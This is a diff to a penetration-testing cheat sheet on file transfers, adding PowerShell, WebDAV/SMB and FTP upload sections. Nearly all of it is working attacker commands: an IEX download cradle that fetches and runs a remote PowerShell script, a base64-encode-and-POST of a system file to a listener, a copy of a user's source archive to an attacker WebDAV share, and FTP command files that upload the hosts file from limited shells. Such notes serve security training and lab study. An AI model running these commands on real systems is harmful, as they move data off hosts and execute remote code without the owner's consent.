@@ -72,7 +72,7 @@ Download via FTP using Powershell
 (New-Object Net.WebClient).DownloadFile('ftp://10.10.10.10/file.txt', '<Output_File_Name>')
 ```
 
-Create a batch file to download our file(useful if we don't have an interactive shell)
+Create a batch file to download our file (useful if we don't have an interactive shell)
 ```cmd
 echo open 192.168.49.128 > ftpcommand.txt
 echo open 192.168.49.128 > ftpcommand.txt
@@ -82,7 +82,65 @@ echo GET file.txt >> ftpcommand.txt
 echo bye >> ftpcommand.txt
 ftp -v -n -s:ftpcommand.txt
 ```
+### PowerShell Web Uploads
+PowerShell doesn't have built-in upload functionality, so we'll have to build it or download it.
 
+Linux Upload Server
+```bash
+# Install
+pip3 install uploadserver
+
+# Usage
+python3 -m uploadserver
+```
+
+PowerShell Script to Upload a file
+```powershell
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File <File_to_upload>
+```
+Powershell Base64 WebUpload
+```powershell
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+# Convert file to base64 and enter into variable $b64
+Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+# Send a web request with the base64 variable in the body
+# catch the string with netcat on the other end, and base64 decode the body, giving you the original file
+```
+### SMB Uploads
+Installing WebDav Server
+```bash
+# apt
+sudo apt install python3-wsgidav
+# pip
+sudo pip3 install wsgidav cheroot
+```
+Starting the webdav python module
+```bash
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+```
+Connecting to the WebDav share from Windows
+```cmd
+dir \\10.10.10.10\DavWWWRoot
+# DavWWWRoot is not the name of a share. It's a special keyword fro the mini-redirector driver to connect to a webdav share
+```
+Uploading files using SMB WebDAV
+```cmd
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+```
+### FTP Uploads
+```powershell
+(New-Object Net.WebClient).UploadFile('ftp://10.10.10.10/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
+Create a command file for the client to upload a file (useful in limited shells)
+```cmd
+echo open 192.168.49.128 > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+ftp -v -n -s:ftpcommand.txt
+```
 ## Transferring with Code
 ## Misc File Transfer Methods
 ## Catching files over HTTP/S
